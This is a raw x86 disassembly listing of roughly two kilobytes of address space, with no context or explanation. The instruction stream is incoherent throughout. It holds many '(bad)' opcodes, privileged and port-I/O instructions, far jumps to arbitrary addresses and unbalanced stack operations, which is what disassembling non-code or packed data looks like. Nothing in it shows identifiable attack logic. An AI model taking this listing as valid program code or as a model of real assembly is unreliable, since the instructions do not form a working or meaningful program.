  4186a4:	mov    edx,0x6f72d2cc
  4186a9:	sti    
  4186aa:	jnp    0x41870c
  4186ac:	hlt    
  4186ad:	pop    eax
  4186ae:	push   ss
  4186af:	xlat   BYTE PTR ds:[ebx]
  4186b0:	inc    esi
  4186b1:	or     ecx,DWORD PTR [ebx]
  4186b3:	mov    esp,0x8d5cc16b
  4186b8:	aaa    
  4186b9:	popa   
  4186ba:	mov    dh,0x82
  4186bc:	and    eax,0xd45f8c6b
  4186c1:	inc    BYTE PTR [ebx+0x1ccacf3e]
  4186c7:	xor    BYTE PTR [ebp+0x2a4ac029],ah
  4186cd:	push   ebx
  4186ce:	sahf   
  4186cf:	scas   eax,DWORD PTR es:[edi]
  4186d0:	mov    ecx,0x95bb92f1
  4186d5:	pushf  
  4186d6:	les    ebp,FWORD PTR [ebx]
  4186d8:	stos   BYTE PTR es:[edi],al
  4186d9:	mov    ebp,0xa8765bb4
  4186de:	dec    esp
  4186df:	out    0x9b,eax
  4186e1:	ret    0x27a5
  4186e4:	sbb    eax,0x7dc93887
  4186e9:	push   ebx
  4186ea:	imul   eax,DWORD PTR es:[edi+0x45699637],0xffffffe8
  4186f2:	push   0x539e6d10
  4186f7:	xor    eax,0x5fc3b85c
  4186fc:	dec    esi
  4186fd:	xlat   BYTE PTR ds:[ebx]
  4186fe:	and    ebx,ecx
  418700:	xlat   BYTE PTR ds:[ebx]
  418701:	or     esi,ebx
  418703:	cwde   
  418704:	addr16 in al,0xce
  418707:	jae    0x418747
  418709:	lahf   
  41870a:	ss sbb al,0x8b
  41870d:	add    ebx,DWORD PTR [edi-0x6fbbcf30]
  418713:	pop    eax
  418714:	and    eax,esp
  418716:	jbe    0x4186cc
  418718:	jno    0x4186be
  41871a:	das    
  41871b:	mov    dl,0x81
  41871d:	jo     0x4186a6
  41871f:	loopne 0x4186ab
  418721:	xchg   ebx,eax
  418722:	push   eax
  418723:	mov    esp,0x3b0056c1
  418728:	mov    ?,ebp
  41872a:	cdq    
  41872b:	pop    ebx
  41872c:	iret   
  41872d:	aaa    
  41872e:	push   esi
  41872f:	cmp    eax,0x49d1624d
  418734:	inc    edi
  418735:	idiv   BYTE PTR [ebx+ecx*1-0x10]
  418739:	repnz mov ds:0xde9a2e6f,al
  41873f:	xor    eax,0x8fdc5953
  418744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418745:	sub    ecx,0x9f0a797c
  41874b:	sbb    dh,BYTE PTR [eax]
  41874d:	push   edi
  41874e:	xchg   BYTE PTR [ebx],ch
  418750:	pop    ecx
  418751:	mov    al,ds:0xc69310b3
  418756:	add    DWORD PTR [esi],0xb363f383
  41875c:	lahf   
  41875d:	dec    ebp
  41875e:	xchg   BYTE PTR [ebp-0x3c],bh
  418761:	icebp  
  418762:	jb     0x4186f0
  418764:	jl     0x4187a4
  418766:	jmp    0xab59:0x9f3d69a6
  41876d:	(bad)  
  41876e:	hlt    
  41876f:	ja     0x418731
  418771:	in     eax,dx
  418772:	jp     0x418778
  418774:	push   0xffffffd8
  418776:	xchg   esi,eax
  418777:	and    al,0x61
  418779:	push   ebx
  41877a:	aas    
  41877b:	cs sub eax,0x42884bb7
  418781:	fidivr DWORD PTR es:[edi]
  418784:	scas   eax,DWORD PTR es:[edi]
  418785:	repz enter 0xfd44,0x7e
  41878a:	shl    DWORD PTR [esi],1
  41878c:	pop    esi
  41878d:	cdq    
  41878e:	retf   
  41878f:	ret    0xb5f6
  418792:	pop    ss
  418793:	mov    edx,0x76b32f79
  418798:	sub    DWORD PTR [edi-0x13373c88],edi
  41879e:	adc    al,0x1a
  4187a0:	cmp    ch,BYTE PTR [ebx+ebp*1]
  4187a3:	cmp    al,0x6d
  4187a5:	inc    edi
  4187a6:	push   esi
  4187a7:	jl     0x4187e2
  4187a9:	test   edi,esp
  4187ab:	enter  0xc88a,0xd2
  4187af:	sub    al,0xaa
  4187b1:	sub    esp,DWORD PTR [ebx]
  4187b3:	jns    0x418738
  4187b5:	(bad)  
  4187b6:	imul   esi,DWORD PTR [edx],0xd962ec7b
  4187bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187bd:	inc    esi
  4187be:	mov    ds:0xbcd898d8,al
  4187c3:	mov    eax,0x59fe461d
  4187c8:	jp     0x4187ce
  4187ca:	cli    
  4187cb:	sub    eax,0x96ed8428
  4187d0:	ds jge 0x4187e2
  4187d3:	fwait
  4187d4:	inc    edx
  4187d5:	mul    DWORD PTR [eax-0x80]
  4187d8:	and    esi,DWORD PTR ds:0xae40743a
  4187de:	ins    BYTE PTR es:[edi],dx
  4187df:	dec    edi
  4187e0:	repnz mov eax,0x71e7a044
  4187e6:	mov    eax,0xd2da4a2f
  4187eb:	popa   
  4187ec:	and    bl,ch
  4187ee:	dec    eax
  4187ef:	fldcw  WORD PTR [ecx+0x4b]
  4187f2:	outs   dx,BYTE PTR ds:[esi]
  4187f3:	push   ebp
  4187f4:	xchg   ebx,eax
  4187f5:	das    
  4187f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187f7:	or     BYTE PTR [esi+0x5b],0x14
  4187fb:	pop    esp
  4187fc:	mov    cl,0x89
  4187fe:	jae    0x418783
  418800:	and    eax,0x550b1941
  418805:	pop    ecx
  418806:	js     0x4187b2
  418808:	jns    0x418811
  41880a:	mov    al,0x43
  41880c:	idiv   DWORD PTR [ebp+0x22]
  41880f:	sti    
  418810:	jge    0x4187e8
  418812:	and    dh,cl
  418814:	(bad)  
  418815:	push   0x44
  418817:	inc    ebx
  418818:	imul   BYTE PTR [edx-0x69d63f62]
  41881e:	lahf   
  41881f:	mov    edx,0x6c6bb8cd
  418824:	mov    esp,0x265e68e1
  418829:	pop    ebx
  41882a:	inc    edi
  41882b:	fld    TBYTE PTR [ebx]
  41882d:	adc    bh,dh
  41882f:	in     al,0xea
  418831:	icebp  
  418832:	xchg   esp,eax
  418833:	es jns 0x418823
  418836:	shl    BYTE PTR [ebx],cl
  418838:	xchg   edx,eax
  418839:	mov    al,0x4e
  41883b:	cwde   
  41883c:	aaa    
  41883d:	jmp    0x3582458e
  418842:	cwde   
  418843:	jnp    0x418864
  418845:	ficom  WORD PTR [ebp+0x3c]
  418848:	add    al,0x9f
  41884a:	mov    edx,0x9b167bff
  41884f:	(bad)  
  418850:	out    dx,al
  418851:	dec    edx
  418852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418853:	clc    
  418854:	fs mov ecx,0x3e1bb0db
  41885a:	enter  0xda59,0xf0
  41885e:	sbb    DWORD PTR [esi],edx
  418860:	cwde   
  418861:	inc    esi
  418862:	(bad)  
  418863:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418864:	arpl   WORD PTR [eax+0x4bb2f0c3],si
  41886a:	dec    esi
  41886b:	mov    dh,0xf6
  41886d:	mov    edi,0x52d6f855
  418872:	sub    DWORD PTR [edi-0x76],ebx
  418875:	or     al,0xb3
  418877:	stc    
  418878:	(bad)  
  418879:	mov    bl,0xcd
  41887b:	push   esi
  41887c:	cwde   
  41887d:	loope  0x41881f
  41887f:	sub    DWORD PTR ds:0x79b3a797,ecx
  418885:	push   esp
  418886:	or     ah,BYTE PTR [edi+0x8a6305c]
  41888c:	arpl   WORD PTR [edi-0x6e],dx
  41888f:	xor    al,0xb5
  418891:	in     al,dx
  418892:	cdq    
  418893:	sbb    ecx,DWORD PTR [edi]
  418895:	jecxz  0x418840
  418897:	mov    esi,0xf38f9fa3
  41889c:	add    ecx,esp
  41889e:	push   es
  41889f:	xchg   BYTE PTR ds:0x36add3e1,ah
  4188a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188a6:	push   eax
  4188a7:	pop    edx
  4188a8:	pop    esi
  4188a9:	ficom  WORD PTR ss:[ebx-0x51204899]
  4188b0:	fisubr WORD PTR [ecx+0x4b]
  4188b3:	mov    bl,0x6d
  4188b5:	ret    
  4188b6:	mov    eax,0xe2d4e8d1
  4188bb:	dec    edi
  4188bc:	pusha  
  4188bd:	(bad)  
  4188be:	call   0x22d90f9d
  4188c3:	dec    eax
  4188c4:	and    al,0x95
  4188c6:	in     eax,0xf0
  4188c8:	stos   DWORD PTR es:[edi],eax
  4188c9:	cmp    bl,BYTE PTR [ecx]
  4188cb:	(bad)  
  4188cc:	sahf   
  4188cd:	jp     0x41893f
  4188cf:	dec    edx
  4188d0:	inc    esi
  4188d1:	inc    edx
  4188d2:	mov    edi,0xb5508d68
  4188d7:	inc    ebp
  4188d8:	test   DWORD PTR [ebx-0x7f],ecx
  4188db:	test   al,0x90
  4188dd:	xor    eax,0xbaeae608
  4188e2:	xchg   esp,eax
  4188e3:	fimul  WORD PTR [ecx]
  4188e5:	and    edx,DWORD PTR [edx+0x532d3ce3]
  4188eb:	adc    BYTE PTR [ecx+0x3a2f44a3],dh
  4188f1:	adc    DWORD PTR [ebx+0x495b67],ebp
  4188f7:	addr16 inc ebx
  4188f9:	xor    DWORD PTR [edx-0x30],ebp
  4188fc:	and    BYTE PTR [ecx+0x3a],ch
  4188ff:	cmp    al,0x53
  418901:	stos   DWORD PTR es:[edi],eax
  418902:	aas    
  418903:	inc    esi
  418904:	cmp    ecx,DWORD PTR [edx+eax*8-0x3cd21f9d]
  41890b:	pop    ebp
  41890c:	arpl   bx,cx
  41890e:	xchg   BYTE PTR [edx-0x47],dh
  418911:	fist   DWORD PTR [edi+0x4b7368e4]
  418917:	and    eax,0x7e3544e0
  41891c:	vmread ecx,eax
  41891f:	inc    ecx
  418920:	or     eax,ecx
  418922:	xchg   esi,eax
  418923:	xchg   ebp,eax
  418924:	test   eax,0x1fe3e0c1
  418929:	ins    BYTE PTR es:[edi],dx
  41892a:	rol    DWORD PTR [edi],cl
  41892c:	pop    eax
  41892d:	mov    dh,0x90
  41892f:	pushf  
  418930:	push   0x63
  418932:	rol    DWORD PTR [ecx+0x4a4a72bc],0xc2
  418939:	mov    ds:0xc89b4f5d,al
  41893e:	(bad)  
  41893f:	rol    bl,cl
  418941:	test   edx,ebp
  418943:	rcr    DWORD PTR [ecx-0x247f6ca8],0xc6
  41894a:	mov    al,0x4a
  41894c:	add    eax,0x667ff8ec
  418951:	cmp    dh,BYTE PTR [ebx]
  418953:	push   cs
  418954:	lods   eax,DWORD PTR ds:[esi]
  418955:	cdq    
  418956:	sub    esi,DWORD PTR [ebp+edx*2+0x57]
  41895a:	jne    0x418941
  41895c:	lods   al,BYTE PTR ds:[esi]
  41895d:	aam    0x3a
  41895f:	xchg   bl,cl
  418961:	mov    es,WORD PTR [eax+0x5d]
  418964:	xor    ecx,esi
  418966:	test   al,0xef
  418968:	push   0x639747f5
  41896d:	add    BYTE PTR [edx+0x257159c9],dh
  418973:	inc    ebx
  418974:	mul    DWORD PTR [esi]
  418976:	jmp    0xc262:0xa71ae850
  41897d:	cmp    esp,DWORD PTR [edi-0x15a2ec22]
  418983:	retf   0xfb11
  418986:	in     al,dx
  418987:	push   ecx
  418988:	retf   
  418989:	shl    DWORD PTR [ebx],cl
  41898b:	and    al,0x83
  41898d:	cmp    BYTE PTR [esi+0x65f2eb4d],dh
  418993:	and    esp,ecx
  418995:	inc    edi
  418996:	addr16 pushf 
  418998:	scas   al,BYTE PTR es:[edi]
  418999:	jbe    0x418924
  41899b:	pop    es
  41899c:	xchg   BYTE PTR [esi+0x5ce2e3b8],dh
  4189a2:	or     dl,dl
  4189a4:	push   cs
  4189a5:	xchg   ebp,eax
  4189a6:	inc    ebp
  4189a7:	push   eax
  4189a8:	cmp    eax,0x70535d84
  4189ad:	push   ds
  4189ae:	adc    cl,BYTE PTR [edi]
  4189b0:	repz fs sahf 
  4189b3:	pushf  
  4189b4:	sub    BYTE PTR [esi+0x5b6e4df4],ah
  4189ba:	call   0x38ec2c38
  4189bf:	adc    esp,DWORD PTR [ebx]
  4189c1:	(bad)  
  4189c2:	fld    DWORD PTR [edx-0x38c77d93]
  4189c8:	mov    ds:0x81bb1ad2,al
  4189cd:	pop    ecx
  4189ce:	ja     0x418985
  4189d0:	jnp    0x4189a8
  4189d2:	mov    ds:0xe5688ce,eax
  4189d7:	retf   0x80bf
  4189da:	in     eax,dx
  4189db:	cmp    BYTE PTR [eax],bh
  4189dd:	jecxz  0x4189b0
  4189df:	popf   
  4189e0:	mov    eax,0x95b7c623
  4189e5:	rcl    DWORD PTR [edi],cl
  4189e7:	jp     0x4189fb
  4189e9:	bound  eax,QWORD PTR [ebx-0x2b]
  4189ec:	dec    ebx
  4189ed:	push   edx
  4189ee:	or     DWORD PTR [edx],esi
  4189f0:	dec    esp
  4189f1:	cmp    eax,0x4c89c413
  4189f6:	pop    edx
  4189f7:	mov    es,WORD PTR [edx-0x48]
  4189fa:	xor    al,0x83
  4189fc:	mov    cr7,eax
  4189ff:	jp     0x418a46
  418a01:	and    eax,0xfe7cf2ea
  418a06:	cdq    
  418a07:	retf   
  418a08:	ret    
  418a09:	mov    ah,0x4b
  418a0b:	mov    gs,WORD PTR [ebx-0x4]
  418a0e:	xlat   BYTE PTR ds:[ebx]
  418a0f:	adc    BYTE PTR [ebx],ah
  418a11:	sub    ecx,DWORD PTR [ecx-0x3a27d872]
  418a17:	cwde   
  418a18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a1a:	xor    dl,BYTE PTR [ecx]
  418a1c:	leave  
  418a1d:	daa    
  418a1e:	sar    esi,cl
  418a20:	dec    edi
  418a21:	push   cs
  418a22:	jbe    0x418a4f
  418a24:	(bad)  
  418a25:	pop    edi
  418a26:	fsubr  st(4),st
  418a28:	jle    0x418a99
  418a2a:	call   0x9ac6:0xbb5655e9
  418a31:	mov    ebp,0x3a9d68d0
  418a36:	dec    ebp
  418a37:	xchg   BYTE PTR [esi],bl
  418a39:	inc    edx
  418a3a:	dec    ebp
  418a3b:	xor    BYTE PTR [ebp+0x1d],al
  418a3e:	icebp  
  418a3f:	jg     0x418a16
  418a41:	sbb    al,0xc2
  418a43:	ror    BYTE PTR [esi],1
  418a45:	mov    ds:0xd40843c7,eax
  418a4a:	fwait
  418a4b:	jbe    0x418a82
  418a4d:	icebp  
  418a4e:	or     al,0x10
  418a50:	sub    eax,0x2a560a3a
  418a55:	jmp    0x6a5e:0x8a11bc25
  418a5c:	hlt    
  418a5d:	pop    esp
  418a5e:	mov    eax,ds:0xd6a955fa
  418a63:	cdq    
  418a64:	xchg   ecx,eax
  418a65:	and    al,0x67
  418a67:	xchg   ebx,eax
  418a68:	mov    dl,0xbe
  418a6a:	ins    BYTE PTR es:[edi],dx
  418a6b:	add    ah,cl
  418a6d:	cld    
  418a6e:	push   esi
  418a6f:	add    DWORD PTR [ebx+ecx*4],ebx
  418a72:	xor    al,0x68
  418a74:	and    al,0x46
  418a76:	mov    ds:0x19900119,eax
  418a7b:	cmp    DWORD PTR [ebx+0x3e3d4a2],edx
  418a81:	jle    0x418aea
  418a83:	ret    0xa411
  418a86:	dec    esp
  418a87:	(bad)  [esp+esi*4-0x7e039afa]
  418a8e:	xchg   DWORD PTR [ebx-0x678dea02],esi
  418a94:	int    0xb
  418a96:	in     al,0x51
  418a98:	mov    ebx,DWORD PTR [edi+edi*1+0x9]
  418a9c:	xor    BYTE PTR [eax+0x673e99e8],dh
  418aa2:	xchg   BYTE PTR [edi],al
  418aa4:	scas   eax,DWORD PTR es:[edi]
  418aa5:	lds    esi,FWORD PTR [edx+eiz*1]
  418aa8:	fisub  DWORD PTR [edx+ebp*4-0x54]
  418aac:	dec    esp
  418aad:	loop   0x418af7
  418aaf:	pop    esp
  418ab0:	xor    BYTE PTR [esp+edx*8],bh
  418ab3:	sub    esp,DWORD PTR [esi]
  418ab5:	or     dh,BYTE PTR [eax-0x63a1121b]
  418abb:	in     al,0x5
  418abd:	imul   edx,DWORD PTR [ebx],0xf14c4e4e
  418ac3:	cmp    eax,0x3292cc50
  418ac8:	mov    cs,WORD PTR [ecx]
  418aca:	push   ds
  418acb:	bound  ebx,QWORD PTR [esp+edx*8]
  418ace:	or     eax,0x5ae855bc
  418ad3:	xchg   DWORD PTR [ecx-0x2040b074],ebp
  418ad9:	out    0x74,al
  418adb:	adc    BYTE PTR [ecx+0x2895f623],cl
  418ae1:	jp     0x418aef
  418ae3:	fist   DWORD PTR ds:0x528012b5
  418ae9:	pop    edx
  418aea:	push   esp
  418aeb:	outs   dx,BYTE PTR ds:[esi]
  418aec:	fidivr DWORD PTR [esp+edx*1+0x67]
  418af0:	mov    dl,dl
  418af2:	push   edx
  418af3:	pop    es
  418af4:	icebp  
  418af5:	icebp  
  418af6:	lods   eax,DWORD PTR ds:[esi]
  418af7:	fidiv  WORD PTR [eax-0x72]
  418afa:	mov    ebx,0xf0ec41f7
  418aff:	data16 outs dx,BYTE PTR ds:[esi]
  418b01:	dec    ebp
  418b02:	lods   al,BYTE PTR ds:[esi]
  418b03:	iret   
  418b04:	xchg   edi,eax
  418b05:	jmp    0x7ba17de2
  418b0a:	cs push edi
  418b0c:	jg     0x418ab8
  418b0e:	cmp    BYTE PTR [esi-0xc7a316a],bh
  418b14:	imul   ebp,DWORD PTR [esi+0x0],0xb1eafecb
  418b1b:	push   esp
  418b1c:	jno    0x418b06
  418b1e:	mov    BYTE PTR [esp+eiz*8-0x48],ah
  418b22:	jmp    0x194c2bee
  418b27:	push   0x70f761d2
  418b2c:	les    edx,FWORD PTR [edx-0x4]
  418b2f:	cdq    
  418b30:	(bad)  
  418b31:	xor    edi,DWORD PTR [ecx+0x8]
  418b34:	cld    
  418b35:	popa   
  418b36:	imul   eax,DWORD PTR [ebp-0x28],0xeb6049d
  418b3d:	fnsave [ebx]
  418b3f:	mov    al,0x2f
  418b41:	jmp    0x8fe0374d
  418b46:	cmp    DWORD PTR [edx+ebx*2-0x3e],0x448fcf72
  418b4e:	dec    ebx
  418b4f:	rol    DWORD PTR [eax],1
  418b51:	aas    
  418b52:	out    dx,eax
  418b53:	xchg   ecx,eax
  418b54:	sub    esi,ebx
  418b56:	and    al,0x88
  418b58:	push   edi
  418b59:	and    eax,0x5fda519c
  418b5e:	adc    dl,cl
  418b60:	inc    eax
  418b61:	dec    ebp
  418b62:	sub    al,0x40
  418b64:	cli    
  418b65:	cdq    
  418b66:	neg    dh
  418b68:	retf   0xd0a6
  418b6b:	dec    dl
  418b6d:	imul   esp,DWORD PTR [ecx+0x3fbdd765],0x52
  418b74:	lods   al,BYTE PTR ds:[esi]
  418b75:	fwait
  418b76:	inc    edx
  418b77:	jne    0x418b20
  418b79:	push   0xadef3003
  418b7e:	sbb    eax,0xf8b8c26c
  418b83:	pop    esi
  418b84:	jno    0x418b17
  418b86:	adc    al,0x1b
  418b88:	push   es
  418b89:	jne    0x418b10
  418b8b:	ins    BYTE PTR es:[edi],dx
  418b8c:	jo     0x418b12
  418b8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b8f:	pusha  
  418b90:	mov    ah,0x86
  418b92:	xchg   BYTE PTR [edi],ch
  418b94:	jp     0x418be3
  418b96:	mov    eax,DWORD PTR [edi-0x63]
  418b99:	or     dh,BYTE PTR [ebx-0x27]
  418b9c:	sbb    edx,DWORD PTR [esi-0xe470b99]
  418ba2:	push   ecx
  418ba3:	les    ebp,FWORD PTR ds:0x2fe53433
  418baa:	lds    ebx,FWORD PTR [edx+0x17]
  418bad:	and    bl,bl
  418baf:	inc    ebp
  418bb0:	and    BYTE PTR ds:0x1a68a5d9,al
  418bb6:	sub    BYTE PTR [ecx-0x1455f311],cl
  418bbc:	bound  eax,QWORD PTR [esi+eiz*4-0x7542887]
  418bc3:	add    dl,BYTE PTR [esi+0x4e]
  418bc6:	out    dx,al
  418bc7:	and    BYTE PTR [ebx],ah
  418bc9:	xchg   edi,eax
  418bca:	rol    BYTE PTR [ebx+0x4f],1
  418bcd:	shl    DWORD PTR [edx-0x2ee9ab47],0x44
  418bd4:	mov    ebp,0xe3822508
  418bd9:	mov    edx,0x680d05e6
  418bde:	jnp    0x418c51
  418be0:	adc    BYTE PTR [esi],bh
  418be2:	push   ebx
  418be3:	shl    DWORD PTR [eax],cl
  418be5:	nop
  418be6:	std    
  418be7:	out    dx,eax
  418be8:	out    dx,eax
  418be9:	repz jne 0x418bc9
  418bec:	jp     0x418ba6
  418bee:	push   cs
  418bef:	inc    edx
  418bf0:	sub    BYTE PTR [edi-0x691fc210],0xbc
  418bf7:	jle    0x418bd9
  418bf9:	mul    BYTE PTR [ecx+0x4f63eefe]
  418bff:	dec    eax
  418c00:	retf   0x44a6
  418c03:	sbb    eax,0x71c13a30
  418c08:	mov    eax,0x7f3ab5a
  418c0d:	in     eax,dx
  418c0e:	xchg   ebp,eax
  418c0f:	push   ss
  418c10:	test   BYTE PTR [ecx-0x76],dh
  418c13:	sub    ebp,DWORD PTR [edi]
  418c15:	sbb    al,0xf0
  418c17:	fcmovb st,st(0)
  418c19:	lds    edx,FWORD PTR [eax-0x18917cc6]
  418c1f:	ins    DWORD PTR es:[edi],dx
  418c20:	or     bl,BYTE PTR [edx-0x2e742f01]
  418c26:	stos   WORD PTR es:[edi],ax
  418c28:	jp     0x418c68
  418c2a:	push   es
  418c2b:	xchg   ebp,eax
  418c2c:	cmp    al,al
  418c2e:	push   ebp
  418c2f:	jae    0x418bc6
  418c31:	scas   eax,DWORD PTR es:[edi]
  418c32:	or     ecx,DWORD PTR [ecx+0x3578adf5]
  418c38:	or     cl,BYTE PTR [edx]
  418c3a:	aad    0x1a
  418c3c:	jle    0x418c4d
  418c3e:	or     esp,edi
  418c40:	inc    ecx
  418c41:	push   ds
  418c42:	scas   eax,DWORD PTR es:[edi]
  418c43:	sahf   
  418c44:	dec    ebx
  418c45:	outs   dx,DWORD PTR ds:[esi]
  418c46:	xor    ah,cl
  418c48:	mov    ds:0xfc82b5cc,eax
  418c4d:	fcmovnu st,st(7)
  418c4f:	fild   WORD PTR [ecx-0x62]
  418c52:	bsr    esi,DWORD PTR [eax+0x76]
  418c56:	inc    eax
  418c57:	mov    dh,0x84
  418c59:	aam    0xec
  418c5b:	fwait
  418c5c:	test   bh,cl
  418c5e:	in     al,0x43
  418c60:	ds enter 0x44c,0xe3
  418c65:	mov    al,0xba
  418c67:	jae    0x418c91
  418c69:	sbb    dh,ah
  418c6b:	pop    esi
  418c6c:	test   BYTE PTR [esi+0x354a56a7],0x86
  418c73:	mov    ebp,DWORD PTR ds:0x300ec644
  418c79:	icebp  
  418c7a:	xor    eax,0xadec895a
  418c7f:	pop    ds
  418c80:	cwde   
  418c81:	jb     0x418ce5
  418c83:	push   0x893649cb
  418c88:	call   0x5335:0xfaa16e4c
  418c8f:	push   es
  418c90:	lea    edi,[edx-0x75]
  418c93:	xlat   BYTE PTR ds:[ebx]
  418c94:	fnsave [ecx-0x3d818ef4]
  418c9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c9b:	push   esp
  418c9c:	les    edi,FWORD PTR [ecx-0x20]
  418c9f:	add    ch,BYTE PTR [ebp+0x49dfafd5]
  418ca5:	adc    esp,DWORD PTR [edi]
  418ca7:	mov    edi,0x871da2cf
  418cac:	fild   WORD PTR [edx]
  418cae:	inc    edi
  418caf:	jg     0x418ca3
  418cb1:	and    esp,ecx
  418cb3:	push   ebx
  418cb4:	push   esi
  418cb5:	je     0x418cbf
  418cb7:	(bad)  
  418cb8:	mov    ebx,0x71175527
  418cbd:	gs or  ebp,edi
  418cc0:	add    ebx,edi
  418cc2:	push   ss
  418cc3:	pop    edx
  418cc4:	ins    BYTE PTR es:[edi],dx
  418cc5:	and    eax,0xd15029c3
  418cca:	nop
  418ccb:	push   ecx
  418ccc:	inc    edx
  418ccd:	test   DWORD PTR ds:0xe3f33fb8,0x815dd555
  418cd7:	dec    ebp
  418cd8:	adc    DWORD PTR [eax-0x172cb913],eax
  418cde:	rol    DWORD PTR [edx],1
  418ce0:	popf   
  418ce1:	ds out dx,eax
  418ce3:	loop   0x418d2f
  418ce5:	pop    ss
  418ce6:	jnp    0x418d2b
  418ce8:	call   0x6c7776ec
  418ced:	xlat   BYTE PTR ds:[ebx]
  418cee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cef:	pop    edi
  418cf0:	sbb    eax,0x6751e91e
  418cf5:	mov    ds:0x4f65f3f3,al
  418cfa:	push   ebp
  418cfb:	fdivr  DWORD PTR [ebx]
  418cfd:	retf   0x17e
  418d00:	jnp    0x418ca7
  418d02:	daa    
  418d03:	and    esi,DWORD PTR [edi-0x73]
  418d06:	pop    eax
  418d07:	sub    al,0xb6
  418d09:	push   cs
  418d0a:	dec    ebx
  418d0b:	dec    ecx
  418d0c:	psubusw mm4,QWORD PTR [esi+ebp*2-0x6f45d57c]
  418d14:	rcr    ebp,cl
  418d16:	stos   BYTE PTR es:[edi],al
  418d17:	jne    0x418cd7
  418d19:	dec    ebp
  418d1a:	jle    0x418cc8
  418d1c:	pop    ebx
  418d1d:	sbb    ch,ah
  418d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d20:	cmp    eax,0x9adac26c
  418d25:	out    0xdb,al
  418d27:	and    al,0x9f
  418d29:	mov    ?,WORD PTR [ebx-0x23]
  418d2c:	add    eax,edi
  418d2e:	cdq    
  418d2f:	test   BYTE PTR [ecx+0x8],ah
  418d32:	dec    esi
  418d33:	xchg   BYTE PTR [edx+0x4b882aa3],cl
  418d39:	or     al,0xf2
  418d3b:	(bad)  
  418d3c:	mov    ebx,0x6cee97ff
  418d41:	in     eax,0xc8
  418d43:	jne    0x418d03
  418d45:	outs   dx,DWORD PTR ds:[esi]
  418d46:	sti    
  418d47:	sahf   
  418d48:	repz adc eax,0x1a3cb358
  418d4e:	mov    ds:0x57501006,al
  418d53:	aas    
  418d54:	gs mov edx,0x75ee0a3c
  418d5a:	pop    eax
  418d5b:	lahf   
  418d5c:	and    eax,0x39f2f545
  418d61:	pusha  
  418d62:	stos   DWORD PTR es:[edi],eax
  418d63:	cmp    DWORD PTR [edx+0x6b],edi
  418d66:	fild   QWORD PTR ds:0x2bd0664
  418d6c:	(bad)  
  418d6d:	out    dx,eax
  418d6e:	hlt    
  418d6f:	sbb    ch,0xa2
  418d72:	je     0x418d7f
  418d74:	mov    dl,0x9
  418d76:	push   eax
  418d78:	and    ax,WORD PTR [ecx]
  418d7b:	or     ecx,esi
  418d7d:	ret    0xe8db
  418d80:	in     al,0xce
  418d82:	sbb    DWORD PTR [eax-0x2b],esi
  418d85:	mov    dh,0x8b
  418d87:	sar    esi,cl
  418d89:	rol    DWORD PTR [ebp+0x13ea94d2],cl
  418d8f:	cmp    esp,esi
  418d91:	sbb    DWORD PTR [edi+ebx*2],ecx
  418d94:	aam    0xfb
  418d96:	pop    ebx
  418d97:	xchg   edi,eax
  418d98:	(bad)  
  418d9a:	sbb    ebp,ebx
  418d9c:	and    ch,0xb9
  418d9f:	pop    ds
  418da0:	xchg   ecx,eax
  418da1:	popf   
  418da2:	push   edx
  418da3:	fs dec eax
  418da5:	cld    
  418da6:	inc    ecx
  418da7:	mov    BYTE PTR [eax],dl
  418da9:	sub    DWORD PTR [edx],edx
  418dab:	mov    ebx,0x985d68a6
  418db0:	xor    BYTE PTR ds:[ebp-0x3f],bh
  418db4:	idiv   DWORD PTR [esi]
  418db6:	push   ebx
  418db7:	push   cs
  418db8:	jnp    0x418d98
  418dba:	mov    ebx,edi
  418dbc:	xchg   ebx,eax
  418dbd:	sub    eax,0x63fdce42
  418dc2:	ds mov esp,0x89ee24f4
  418dc8:	dec    eax
  418dc9:	pop    esi
  418dca:	mov    ds:0x85f3e761,al
  418dcf:	pop    edx
  418dd0:	mov    dl,0x5f
  418dd2:	or     eax,0xa0025f72
  418dd7:	ja     0x418dbb
  418dd9:	pop    es
  418dda:	outs   dx,DWORD PTR ds:[esi]
  418ddb:	pop    edi
  418ddc:	les    ecx,FWORD PTR [esi]
  418dde:	test   BYTE PTR [edi-0x5e],0xe4
  418de2:	aam    0xe1
  418de4:	stos   BYTE PTR es:[edi],al
  418de5:	(bad)  
  418de7:	adc    al,0xa
  418de9:	cmovp  ebx,DWORD PTR [eax+edx*2+0x3a]
  418dee:	pop    ebx
  418def:	add    esp,esi
  418df1:	add    dl,BYTE PTR [esp+edi*4-0x1ad86447]
  418df8:	aad    0xda
  418dfa:	mov    BYTE PTR [eax-0x54],cl
  418dfd:	or     BYTE PTR [eax],cl
  418dff:	pop    esp
  418e00:	repnz fwait
  418e02:	jg     0x418dcd
  418e04:	mov    DWORD PTR [edi+0x62b92402],ecx
  418e0a:	jae    0x418dbd
  418e0c:	lea    edi,[edx-0x6a]
  418e0f:	inc    esi
  418e10:	lds    ebp,FWORD PTR [ebx+ebx*8-0x23]
  418e14:	in     al,dx
  418e15:	mov    dh,0xf8
  418e17:	gs dec ebx
  418e19:	sbb    DWORD PTR [esi+0x71],eax
  418e1c:	(bad)  
  418e1e:	dec    ebx
  418e1f:	fisubr DWORD PTR [eax-0x13]
  418e22:	lds    edx,FWORD PTR [edx]
  418e24:	bound  esp,QWORD PTR [ebx+0x6317e375]
  418e2a:	xchg   edx,eax
  418e2b:	(bad)
  418e2f:	sub    eax,0x9439ae0d
  418e34:	xchg   esp,eax
  418e35:	jns    0x418e04
  418e37:	aaa    
  418e38:	xlat   BYTE PTR es:[ebx]
  418e3a:	int    0x35
  418e3c:	add    al,0xdc
  418e3e:	mov    bh,0x4e
  418e40:	or     BYTE PTR [eax+0xacfb7e0],0x3d
  418e47:	cmp    dl,al
  418e49:	sahf   
  418e4a:	mov    ds:0xfedcc17,al
  418e4f:	jl     0x418e3e
  418e51:	add    ch,cl
  418e53:	adc    dl,dl
  418e55:	das    
